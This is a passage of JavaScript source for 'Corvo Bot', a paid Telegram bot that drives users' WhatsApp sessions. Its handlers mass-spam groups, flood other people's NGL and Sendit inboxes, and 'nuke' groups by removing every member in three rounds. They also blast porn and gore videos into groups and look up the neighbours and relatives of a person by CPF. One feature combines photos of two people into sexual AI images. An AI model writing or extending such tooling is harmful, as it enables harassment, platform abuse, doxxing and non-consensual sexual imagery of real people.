    const msg = await ctx.reply('<blockquote>🧹 <b>CHAT LIMPO COM SUCESSO!</b></blockquote>', { parse_mode: 'HTML' });
    setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => { }), 3000);
});

bot.command('genkey', async (ctx) => {
    const tid = ctx.from.id;
    if (tid !== ADMIN_ID) return;

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('<blockquote>⚠️ <b>USO INCORRETO:</b>\n\nUse: <code>/genkey &lt;dias&gt;</code>\nExemplo: <code>/genkey 7</code></blockquote>', { parse_mode: 'HTML' });
    }

    const days = parseInt(args[1]);
    if (isNaN(days) || days <= 0) {
        return ctx.reply('<blockquote>⚠️ O número de dias deve ser maior que 0.</blockquote>', { parse_mode: 'HTML' });
    }

    const key = 'CORVO-VIP-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    
    vipKeys[key] = {
        days: days,
        createdAt: Date.now(),
        used: false,
        usedBy: null,
        usedAt: null
    };
    saveVipKeys();

    const responseMsg = `<blockquote>🔑 <b>NOVA VIP KEY GERADA!</b>\n\n` +
        `• <b>Plano:</b> <code>${days} Dias VIP</code>\n` +
        `• <b>Chave:</b> <code>${key}</code>\n\n` +
        `<i>Envie essa chave para o cliente resgatar usando o comando /redeem &lt;chave&gt;</i></blockquote>`;
        
    await ctx.reply(responseMsg, { parse_mode: 'HTML' });
});

bot.command('redeem', async (ctx) => {
    const tid = ctx.from.id;
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
        return ctx.reply('<blockquote>⚠️ <b>USO INCORRETO:</b>\n\nUse: <code>/redeem &lt;chave&gt;</code>\nExemplo: <code>/redeem CORVO-VIP-XXXX-XXXX</code></blockquote>', { parse_mode: 'HTML' });
    }

    const key = args[1].trim();
    const keyData = vipKeys[key];

    if (!keyData) {
        return ctx.reply('<blockquote>❌ <b>CHAVE INVÁLIDA!</b>\n\nA chave informada não existe ou está incorreta.</blockquote>', { parse_mode: 'HTML' });
    }

    if (keyData.used) {
        return ctx.reply('<blockquote>❌ <b>CHAVE JÁ UTILIZADA!</b>\n\nEsta chave já foi resgatada por outro usuário.</blockquote>', { parse_mode: 'HTML' });
    }

    const days = keyData.days;
    const duration = days * 24 * 60 * 60 * 1000;
    
    if (!vips[tid]) {
        vips[tid] = { type: 'full', expiresAt: Date.now() + duration };
    } else {
        vips[tid].expiresAt = Math.max(vips[tid].expiresAt, Date.now()) + duration;
        vips[tid].type = 'full';
    }
    saveVips();

    keyData.used = true;
    keyData.usedBy = tid;
    keyData.usedAt = Date.now();
    saveVipKeys();

    const dataValidade = new Date(vips[tid].expiresAt).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

    const successMsg = `<blockquote>🎉 <b>VIP ATIVADO COM SUCESSO!</b>\n\n` +
        `Muito obrigado por resgatar sua chave!\n\n` +
        `• <b>Duração:</b> <code>+${days} dias</code>\n` +
        `• <b>Validade:</b> <code>${dataValidade}</code>\n\n` +
        `<i>Aproveite todos os recursos de elite liberados!</i></blockquote>`;

    await ctx.reply(successMsg, { parse_mode: 'HTML' });

    bot.telegram.sendMessage(ADMIN_ID, `<blockquote>🔑 <b>CHAVE VIP RESGATADA!</b>\n\n` +
        `• <b>Usuário:</b> <code>${ctx.from.first_name || 'Desconhecido'}</code> (<code>${tid}</code>)\n` +
        `• <b>Plano:</b> <code>${days} dias</code>\n` +
        `• <b>Chave:</b> <code>${key}</code></blockquote>`, { parse_mode: 'HTML' }).catch(() => {});
});

bot.command('ranking', async (ctx) => {
    const sortedUsers = Object.entries(usersData)
        .filter(([id, data]) => data.stats)
        .sort((a, b) => (b[1].stats.messagesSent || 0) - (a[1].stats.messagesSent || 0))
        .slice(0, 10);

    let rankingMsg = `<blockquote>🏆 <b>TOP 10 DIVULGADORES</b>\n\n`;
    sortedUsers.forEach((user, i) => {
        const medal = i === 0 ? '🥇' : (i === 1 ? '🥈' : (i === 2 ? '🥉' : '👤'));
        rankingMsg += `${medal} <b>${user[1].name || 'Usuário'}</b> - ${user[1].stats.messagesSent} msgs\n`;
    });
    rankingMsg += `\n🚀 <i>Quem será o próximo elite?</i></blockquote>`;

    await ctx.reply(rankingMsg, { parse_mode: 'HTML' });
});

bot.command('perfil', async (ctx) => {
    const tid = ctx.from.id;
    const data = usersData[tid] || {};
    const stats = data.stats || { messagesSent: 0, groupsRajados: 0, nukes: 0 };
    const isVip = isUserVip(tid);

    const profileMsg = `<blockquote>👤 <b>MEU PERFIL ELITE</b>\n\n` +
        `🏷️ <b>Nome:</b> ${ctx.from.first_name}\n` +
        `🆔 <b>ID:</b> <code>${tid}</code>\n` +
        `💎 <b>Plano:</b> ${getUserVipType(tid)}\n` +
        `🚀 <b>Status:</b> ${isVip ? 'ATIVO' : 'EXPIRADO'}\n\n` +
        `📊 <b>ESTATÍSTICAS:</b>\n` +
        `✉️ <b>Mensagens:</b> ${stats.messagesSent}\n` +
        `🎯 <b>Grupos:</b> ${stats.groupsRajados}\n` +
        `💣 <b>Nukes:</b> ${stats.nukes}</blockquote>`;
    await ctx.reply(profileMsg, { parse_mode: 'HTML' });
});

bot.hears('👤 • MEU PERFIL', async (ctx) => {
    const tid = ctx.from.id;
    const data = usersData[tid] || {};
    const stats = data.stats || { messagesSent: 0, groupsRajados: 0, nukes: 0 };
    const isVip = isUserVip(tid);

    const profileMsg = `<blockquote>👤 <b>MEU PERFIL ELITE</b>\n\n` +
        `🏷️ <b>Nome:</b> ${ctx.from.first_name}\n` +
        `🆔 <b>ID:</b> <code>${tid}</code>\n` +
        `💎 <b>Plano:</b> ${getUserVipType(tid)}\n` +
        `🚀 <b>Status:</b> ${isVip ? 'ATIVO' : 'EXPIRADO'}\n\n` +
        `📊 <b>ESTATÍSTICAS:</b>\n` +
        `✉️ <b>Mensagens:</b> ${stats.messagesSent}\n` +
        `🎯 <b>Grupos:</b> ${stats.groupsRajados}\n` +
        `💣 <b>Nukes:</b> ${stats.nukes}</blockquote>`;
    await ctx.reply(profileMsg, { parse_mode: 'HTML' });
});

bot.on('photo', async (ctx) => {
    const tid = ctx.from.id;
    const state = userStates[tid];

    if (state === 'wait_ai_transformer_media') {
        const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
        const mediaData = Buffer.from(JSON.stringify({ type: 'photo', fileId: fileId })).toString('base64');
        userStates[tid] = `wait_ai_transformer_prompt_${mediaData}`;
        return ctx.reply('<blockquote>🎭 <b>MÍDIA RECEBIDA!</b>\n\nAgora, descreva o que você deseja mudar ou adicionar nesta foto.\n\nEx: <i>Transforme em um desenho anime</i> ou <i>mude o fundo para uma praia</i></blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
    }

    if (state === 'wait_ai_fusion_photo1') {
        userStates[tid] = `wait_ai_fusion_photo2_${ctx.message.photo[ctx.message.photo.length - 1].file_id}`;
        return ctx.reply('<blockquote>🔞 <b>PRIMEIRA FOTO RECEBIDA!</b>\n\nAgora envie a <b>SEGUNDA FOTO</b> (ex: o parceiro(a)).</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
    }

    if (state && state.startsWith('wait_ai_fusion_photo2_')) {
        const photo1 = state.replace('wait_ai_fusion_photo2_', '');
        const photo2 = ctx.message.photo[ctx.message.photo.length - 1].file_id;
        userStates[tid] = `wait_ai_fusion_prompt_${photo1}_${photo2}`;
        return ctx.reply('<blockquote>🔞 <b>MÍDIAS PRONTAS!</b>\n\nAgora descreva em detalhes a <b>AÇÃO</b> que deseja que eles realizem.\n\nEx: <i>Trancando em um quarto de hotel luxuoso</i></blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
    }

    const msg = await ctx.reply('🎨 • <b>Criando seu Sticker Elite...</b>', { parse_mode: 'HTML' });
    try {
        const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
        await ctx.replyWithSticker(fileId);
        await ctx.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => { });
    } catch (e) {
        ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, '❌ • Erro ao criar sticker.');
    }
});

bot.start(async (ctx) => {
    const tid = ctx.from.id;
    logEvent('INFO', `Usuário ${ctx.from.first_name} (${tid}) iniciou o bot.`);

    // Registrar entrada inicial se for novo
    if (!usersData[tid]) {
        usersData[tid] = {
            name: ctx.from.first_name,
            username: ctx.from.username,
            firstSeen: Date.now(),
            lastSeen: Date.now()
        };
        saveUsersData();
    }

    // Limpar mensagens antigas para manter o chat limpo
    await clearUserMessages(ctx, tid);

    // Envia uma saudação premium com foto antes do menu principal (Estilo Zenith)
    const welcomePhoto = 'https://files.catbox.moe/t7w3gk.jpg'; // Usando a mesma foto do perfil
    const welcomeText = `<blockquote>👋 <b>OLÁ, BEM-VINDO AO CORVO BOT!</b>\n\n` +
        `O maior e mais potente sistema de automação e divulgação do Brasil.\n\n` +
        `🤖 <b>O que eu posso fazer?</b>\n` +
        `• Rajadas em massa (Texto/Foto/Vídeo)\n` +
        `• Nukar grupos de forma inteligente\n` +
        `• Consultas OSINT exclusivas\n\n` +
        `<i>Clique nos botões abaixo para explorar!</i></blockquote>`;

    await ctx.replyWithPhoto(welcomePhoto, { caption: welcomeText, parse_mode: 'HTML' });

    // Chama a função centralizada de perfil para mostrar o menu inicial
    await sendMainMenuProfile(ctx, tid);
});

bot.on('new_chat_members', async (ctx) => {
    const newMembers = ctx.message.new_chat_members;
    for (const member of newMembers) {
        const name = member.first_name;
        const welcome =
            `<blockquote>👋 <b>BEM-VINDO AO CLÃ CORVO!</b>\n\n` +
            `Olá <b>${name}</b>, seja bem-vindo ao nosso canal oficial.\n\n` +
            `🚀 <b>O que você encontra aqui:</b>\n` +
            `• O melhor bot de rajadas do Brasil\n` +
            `• Consultas de dados exclusivas\n` +
            `• Suporte técnico especializado\n\n` +
            `🤖 <b>Inicie o bot agora:</b> @${ctx.botInfo.username}\n\n` +
            `<i>Prepare-se para o próximo nível.</i></blockquote>`;

        ctx.reply(welcome, { parse_mode: 'HTML' }).catch(() => { });
    }
});

bot.hears('🌍 • Rajar Global (Auto-Search)', async (ctx) => {
    const tid = ctx.from.id;
    userStates[tid] = 'wait_global_keyword';
    ctx.reply('<blockquote>🌍 <b>RAJADA GLOBAL ELITE</b>\n\nDigite uma palavra-chave para buscar grupos na web e rajar automaticamente.\n\nEx: <i>Vendas, Novelas, Gore...</i></blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears(['📱 • CONECTAR WHATSAPP • 📱', '📲 • CONECTAR WHATSAPP', '📱 • CONECTAR NOVO NÚMERO • 📱'], (ctx) => {
    userStates[ctx.from.id] = 'wait_num';
    ctx.reply('📞 • *Digite o número com DDD (ex: 5511999999999):*\n\n_Certifique-se de que o número está correto para receber o código de pareamento._', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears(['🟢 • LIGAR WHATSAPP • ', '🔋 • LIGAR WHATSAPP'], async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    if (userSessions[tid]?.user) {
        const msg = await ctx.reply('✅ • O sistema já está Online!');
        if (msg?.message_id) trackBotMessage(tid, msg.message_id);
        return;
    }
    if (hasSession(tid)) {
        const msg = await ctx.reply('⏳ • *Iniciando conexão CORVO DIV...*', { parse_mode: 'Markdown' }).catch(() => { });
        if (msg?.message_id) trackBotMessage(tid, msg.message_id);
        await connectToWhatsApp(tid, ctx);
    } else {
        const msg = await ctx.reply('❌ • Nenhuma sessão salva encontrada. Por favor, conecte seu número primeiro.', getMainMenu(tid)).catch(() => { });
        if (msg?.message_id) trackBotMessage(tid, msg.message_id);
    }
});

bot.hears(['🔴 • DESLIGAR WHATSAPP • ', '🔌 • DESCONECTAR'], async (ctx) => {
    const tid = ctx.from.id;
    await disconnectWhatsApp(tid);
    ctx.reply('🔴 • *SISTEMA OFFLINE.*', { parse_mode: 'Markdown', ...getMainMenu(tid) }).catch(() => { });
});

bot.hears('🔄 • TROCAR NÚMERO', async (ctx) => {
    const tid = ctx.from.id;
    userStates[tid] = 'wait_num';
    ctx.reply('🔄 • *TROCAR NÚMERO*\n\nDigite o novo número com DDD (ex: 5511999999999):', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

// Função para criar botões de grupos SEM seleção múltipla
const safeGroupButtons = (groups, prefix, page = 0, tid = null) => {
    const pageSize = 10;
    const start = page * pageSize;
    const end = start + pageSize;
    const paginatedGroups = groups.slice(start, end);

    const buttons = paginatedGroups
        .filter(g => g.subject && typeof g.subject === 'string' && g.subject.trim().length > 0)
        .map(g => {
            // NOVO: Agora preserva TODOS os caracteres, apenas limita o tamanho
            let displayName = g.subject.trim();

            // Remove apenas caracteres de controle invisíveis que causam problemas
            displayName = displayName
                .replace(/[\u200B-\u200D\uFEFF]/g, '') // Remove zero-width chars
                .replace(/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/g, ''); // Remove caracteres de controle

            // Limita o tamanho para 35 caracteres
            if (displayName.length > 35) {
                displayName = displayName.substring(0, 35) + '...';
            }

            // Se depois de limpar não sobrou nada, usa ID como fallback
            if (!displayName || displayName.length < 1) {
                displayName = 'Grupo ' + (g.id ? g.id.substring(0, 8) : 'SemNome');
            }

            // Retorna botão direto (SEM checkbox, clica e seleciona)
            return [Markup.button.callback(displayName, `${prefix}_${g.id}`)];
        });

    const navButtons = [];
    if (page > 0) {
        navButtons.push(Markup.button.callback('⬅️ Anterior', `page_${prefix}_${page - 1}`));
    }
    if (end < groups.length) {
        navButtons.push(Markup.button.callback('Próximo ➡️', `page_${prefix}_${page + 1}`));
    }
    if (navButtons.length > 0) {
        buttons.push(navButtons);
    }

    // Adiciona botão SELECIONAR TODOS (NOVO!)
    if (groups.length > 0) {
        buttons.push([Markup.button.callback('✅ Selecionar Todos os Grupos', `select_all_${prefix}`)]);
    }

    // Adiciona botão VOLTAR para menu de rajada
    buttons.push([Markup.button.callback('🔙 Voltar', 'rajar_menu')]);

    return buttons;
};

// Função para criar cabeçalho da lista de grupos
function createGroupListHeader(sock, groups, page, pageSize) {
    const totalPages = Math.ceil(groups.length / pageSize);
    const currentPage = page + 1;
    const sessionPhone = sock?.user?.id ? sock.user.id.split(':')[0] : 'Desconhecido';
    const config = loadUserConfig(sock?.user?.id || 0);
    const quantidade = config.quantidade || 10;

    return (
        `📢 *DIV STATUS - SELECIONE O GRUPO*\n\n` +
        `📱 *Sessao:* ${sessionPhone}\n` +
        `📋 *Grupos:* ${groups.length}\n` +
        `🔢 *Quantidade:* ${quantidade}x\n` +
        `📄 *Pagina:* ${currentPage}/${totalPages}\n\n` +
        `*Escolha o grupo para enviar status:*`
    );
}


bot.hears('🌊 • Flood NGLs', async (ctx) => {
    ctx.reply('🌊 • *MENU DE FLOOD NGL/SENDIT*\n\nEscolha qual serviço deseja floodar:', { parse_mode: 'Markdown', ...getFloodMenu() }).catch(() => { });
});

bot.hears('⚙️ • Configurar Flood', async (ctx) => {
    const tid = ctx.from.id;
    ctx.reply('⚙️ • *CONFIGURAÇÃO DE FLOOD*\n\nDefina a quantidade de envios para floods (NGL/Sendit):', { parse_mode: 'Markdown', ...getFloodConfigMenu(tid) }).catch(() => { });
});

bot.hears(/^🔢 • QUANTIDADE: (.*)/, async (ctx) => {
    userStates[ctx.from.id] = 'wait_flood_qty';
    ctx.reply('🔢 • *Envie a nova QUANTIDADE (1 a 50):*', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears(/^⏳ • DELAY: (.*)/, async (ctx) => {
    userStates[ctx.from.id] = 'wait_flood_delay';
    ctx.reply('⏳ • *Envie o novo DELAY em milissegundos (ex: 500 ou 1000):*', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears(/^🛡️ • ANTI-KICK: (.*)/, async (ctx) => {
    const tid = ctx.from.id;
    const config = loadUserConfig(tid);
    config.antiKick = !config.antiKick;
    saveUserConfig(tid);
    const status = config.antiKick ? 'ATIVADO ✅' : 'DESATIVADO ❌';
    ctx.reply(`🛡️ • *PROTEÇÃO ANTI-KICK:* ${status}`, { parse_mode: 'Markdown', ...getFloodConfigMenu(tid) }).catch(() => { });
});

bot.hears('📝 • ALTERAR TEXTO DA RAJADA', async (ctx) => {
    userStates[ctx.from.id] = 'wait_flood_text';
    ctx.reply('📝 • *Envie o novo TEXTO para suas rajadas:*', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears('🔥 • Flood NGL', async (ctx) => {
    userStates[ctx.from.id] = 'wait_ngl_user';
    ctx.reply('🔥 • *FLOOD NGL*\n\nInforme o *link do perfil* ou apenas o *usuário* do NGL:', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears('🔥 • Flood Sendit', async (ctx) => {
    userStates[ctx.from.id] = 'wait_sendit_link';
    ctx.reply('🔥 • *FLOOD SENDIT*\n\nInforme o *link do sticker* do Sendit (ex: https://reply.getsendit.com/s/xxxx):', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears('🗣️ • Texto para Áudio', async (ctx) => {
    userStates[ctx.from.id] = 'wait_tts_text';
    ctx.reply('🗣️ • <b>TEXTO PARA ÁUDIO</b>\n\nDigite o texto que você deseja converter em áudio:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔗 • Encurtar Link', async (ctx) => {
    userStates[ctx.from.id] = 'wait_shorten_link';
    ctx.reply('🔗 • <b>ENCURTADOR DE LINK</b>\n\nDigite o link que você deseja encurtar:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🎲 • Geradores Elite', async (ctx) => {
    ctx.reply('🎲 • <b>GERADORES ELITE</b>\n\nEscolha o que deseja gerar:', { parse_mode: 'HTML', ...getGeneratorsMenu() });
});

bot.hears('📄 • Gerar CPF', async (ctx) => {
    const cpf = generateCPF();
    ctx.reply(`📄 • <b>CPF GERADO:</b> <code>${cpf}</code>`, { parse_mode: 'HTML' });
});

bot.hears('📄 • Gerar CNPJ', async (ctx) => {
    const cnpj = generateCNPJ();
    ctx.reply(`📄 • <b>CNPJ GERADO:</b> <code>${cnpj}</code>`, { parse_mode: 'HTML' });
});

bot.hears('👤 • Pessoa Aleatória', async (ctx) => {
    const person = generateRandomPerson();
    const msg = `👤 • <b>PESSOA ALEATÓRIA</b>\n\n` +
        `• <b>Nome:</b> ${person.nome}\n` +
        `• <b>CPF:</b> <code>${person.cpf}</code>\n` +
        `• <b>Nasc:</b> ${person.nascimento}\n` +
        `• <b>Mãe:</b> ${person.mae}\n` +
        `• <b>Cidade:</b> ${person.cidade}/${person.uf}`;
    ctx.reply(msg, { parse_mode: 'HTML' });
});

bot.hears('💳 • Gerar Cartão (Teste)', async (ctx) => {
    const card = generateTestCard();
    const msg = `💳 • <b>CARTÃO DE TESTE GERADO</b>\n\n` +
        `• <b>Número:</b> <code>${card.number}</code>\n` +
        `• <b>Validade:</b> ${card.expiry}\n` +
        `• <b>CVV:</b> ${card.cvv}\n` +
        `• <b>Bandeira:</b> ${card.brand}`;
    ctx.reply(msg, { parse_mode: 'HTML' });
});

bot.hears('👥 • Vizinhos Elite', async (ctx) => {
    userStates[ctx.from.id] = 'wait_vizinhos';
    ctx.reply('👥 • <b>VIZINHOS ELITE</b>\n\nDigite o CPF para buscar vizinhos próximos:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('👨‍👩‍👧‍👦 • Parentes Pro', async (ctx) => {
    userStates[ctx.from.id] = 'wait_parentes';
    ctx.reply('👨‍👩‍👧‍👦 <b>PARENTES PRO</b>\n\nDigite o CPF para buscar o núcleo familiar:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🚀 • RAJAR GRUPOS', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sock = userSessions[tid];
    if (!sock?.user) {
        const errMsg = await ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });
        await cleanupAfterReply(ctx, tid, errMsg?.message_id);
        return;
    }
    // Mostra menu sem foto
    const sentMsg = await ctx.reply('🚀 • *MENU DE RAJADA CORVO*\n\nSelecione o tipo de rajada que deseja realizar:', { parse_mode: 'Markdown', ...getRajarMenu() }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('🗳️ RAJAR ENQUETES', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sock = userSessions[tid];
    if (!sock?.user) {
        const errMsg = await ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });
        await cleanupAfterReply(ctx, tid, errMsg?.message_id);
        return;
    }
    try {
        const chats = await sock.groupFetchAllParticipating();
        const groups = Object.values(chats);
        if (groups.length === 0) {
            const errMsg = await ctx.reply('❌ • Nenhum grupo encontrado na sua conta.').catch(() => { });
            await cleanupAfterReply(ctx, tid, errMsg?.message_id);
            return;
        }
        const buttons = safeGroupButtons(groups, 'rajarenquetes', 0, tid);
        const header = createGroupListHeader(sock, groups, 0, 10);
        const sentMsg = await ctx.reply(header, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        }).catch(() => { });
        await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
    } catch (e) {
        console.error('Erro ao buscar grupos:', e);
        const errMsg = await ctx.reply(`❌ • Erro ao buscar grupos: ${e.message}`).catch(() => { });
        await cleanupAfterReply(ctx, tid, errMsg?.message_id);
    }
});

bot.hears('🆔 • Rajar por ID', async (ctx) => {
    const tid = ctx.from.id;
    const sock = userSessions[tid];
    if (!sock?.user) return ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });
    userStates[tid] = 'wait_rajar_id';
    ctx.reply('🆔 • *Informe o ID do grupo que deseja rajar:*\n\n_Você pode obter o ID usando o botão "Listar Grupos" no menu principal._', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears('🔥 • NUKE TURBO (ADMIN) • 🔥', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sock = userSessions[tid];
    if (!sock?.user) {
        const errMsg = await ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });
        await cleanupAfterReply(ctx, tid, errMsg?.message_id);
        return;
    }
    const chats = await sock.groupFetchAllParticipating();
    const groups = Object.values(chats);
    const buttons = safeGroupButtons(groups, 'nuketurbo', 0, tid);
    const sentMsg = await ctx.reply('🔥 • *SELECIONE O GRUPO PARA O NUKE TURBO*\n\n_Este modo realiza 3 rounds de remoção para garantir que ninguém escape._', { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('🚀 • Rajar 1 (Payment)', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sock = userSessions[tid];
    if (!sock?.user) {
        const errMsg = await ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });
        await cleanupAfterReply(ctx, tid, errMsg?.message_id);
        return;
    }
    try {
        const chats = await sock.groupFetchAllParticipating();
        const groups = Object.values(chats);
        if (groups.length === 0) {
            const errMsg = await ctx.reply('❌ • Nenhum grupo encontrado na sua conta.').catch(() => { });
            await cleanupAfterReply(ctx, tid, errMsg?.message_id);
            return;
        }
        const buttons = safeGroupButtons(groups, 'rajar1', 0, tid);
        const header = createGroupListHeader(sock, groups, 0, 10);
        const sentMsg = await ctx.reply(header, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        }).catch(() => { });
        await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
    } catch (e) {
        console.error('Erro ao buscar grupos:', e);
        const errMsg = await ctx.reply(`❌ • Erro ao buscar grupos: ${e.message}`).catch(() => { });
        await cleanupAfterReply(ctx, tid, errMsg?.message_id);
    }
});

bot.hears('🚀 • Rajar 2 (mencionar status)', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sock = userSessions[tid];
    if (!sock?.user) {
        const errMsg = await ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });
        await cleanupAfterReply(ctx, tid, errMsg?.message_id);
        return;
    }
    try {
        const chats = await sock.groupFetchAllParticipating();
        const groups = Object.values(chats);
        if (groups.length === 0) {
            const errMsg = await ctx.reply('❌ • Nenhum grupo encontrado na sua conta.').catch(() => { });
            await cleanupAfterReply(ctx, tid, errMsg?.message_id);
            return;
        }
        const buttons = safeGroupButtons(groups, 'rajar2', 0, tid);
        const sentMsg = await ctx.reply('🎯 • *Selecione o grupo para RAJAR (mencionar status):*', {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        }).catch(() => { });
        await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
    } catch (e) {
        console.error('Erro ao buscar grupos:', e);
        const errMsg = await ctx.reply(`❌ • Erro ao buscar grupos: ${e.message}`).catch(() => { });
        await cleanupAfterReply(ctx, tid, errMsg?.message_id);
    }
});


bot.hears('🚀 • Rajar 3 (Payment + Status)', async (ctx) => {
    const tid = ctx.from.id;
    const sock = userSessions[tid];
    // Apaga mensagem do usuário
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    if (!sock?.user) {
        const errMsg = await ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });
        if (errMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, errMsg.message_id).catch(() => { }), 5000);
        return;
    }
    try {
        const chats = await sock.groupFetchAllParticipating();
        const groups = Object.values(chats);
        if (groups.length === 0) {
            const errMsg = await ctx.reply('❌ • Nenhum grupo encontrado na sua conta.').catch(() => { });
            if (errMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, errMsg.message_id).catch(() => { }), 5000);
            return;
        }
        const buttons = safeGroupButtons(groups, 'rajar3', 0, tid);
        const sentMsg = await ctx.reply('🎯 • *Selecione o grupo para RAJAR (PAYMENT + STATUS):*', {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        }).catch(() => { });
        if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 60000);
    } catch (e) {
        console.error('Erro ao buscar grupos:', e);
        ctx.reply(`❌ • Erro ao buscar grupos: ${e.message}`).catch(() => { });
    }
});

bot.hears('🎬 • Rajar Vídeos (PORNO)', async (ctx) => {
    const tid = ctx.from.id;
    const sock = userSessions[tid];
    if (!sock?.user) return ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });

    try {
        const chats = await sock.groupFetchAllParticipating();
        const groups = Object.values(chats);
        if (groups.length === 0) return ctx.reply('❌ • Nenhum grupo encontrado na sua conta.').catch(() => { });

        const buttons = safeGroupButtons(groups, 'rajarporno', 0, tid);
        ctx.reply('🎯 • *Selecione o grupo para RAJAR VÍDEOS (PORNO):*', {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        }).catch(() => { });
    } catch (e) {
        ctx.reply(`❌ • Erro ao buscar grupos: ${e.message}`).catch(() => { });
    }
});

bot.hears('🎬 • Rajar Vídeos (GORE)', async (ctx) => {
    const tid = ctx.from.id;
    const sock = userSessions[tid];
    if (!sock?.user) return ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });

    try {
        const chats = await sock.groupFetchAllParticipating();
        const groups = Object.values(chats);
        if (groups.length === 0) return ctx.reply('❌ • Nenhum grupo encontrado na sua conta.').catch(() => { });

        const buttons = safeGroupButtons(groups, 'rajargore', 0, tid);
        ctx.reply('🎯 • *Selecione o grupo para RAJAR VÍDEOS (GORE):*', {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        }).catch(() => { });
    } catch (e) {
        ctx.reply(`❌ • Erro ao buscar grupos: ${e.message}`).catch(() => { });
    }
});

bot.hears('🌊 • Rajar 4 (Flood Status)', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sock = userSessions[tid];
    if (!sock?.user) {
        const msg = await ctx.reply('❌ • Ligue o WhatsApp primeiro!', getMainMenu(tid)).catch(() => { });
        await cleanupAfterReply(ctx, tid, msg?.message_id);
        return;
    }

    try {
        const chats = await sock.groupFetchAllParticipating();
        const groups = Object.values(chats);
        if (groups.length === 0) {
            const msg = await ctx.reply('❌ • Nenhum grupo encontrado na sua conta.').catch(() => { });
            await cleanupAfterReply(ctx, tid, msg?.message_id);
            return;
        }

        const buttons = safeGroupButtons(groups, 'rajar4', 0, tid);
        const msg = await ctx.reply('🌊 • *Selecione o grupo para RAJAR 4 (FLOOD STATUS):*\n\n_Após selecionar, você poderá enviar texto, foto ou vídeo._', {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons)
        }).catch(() => { });
        // DEPOIS de mostrar a lista, limpa as antigas
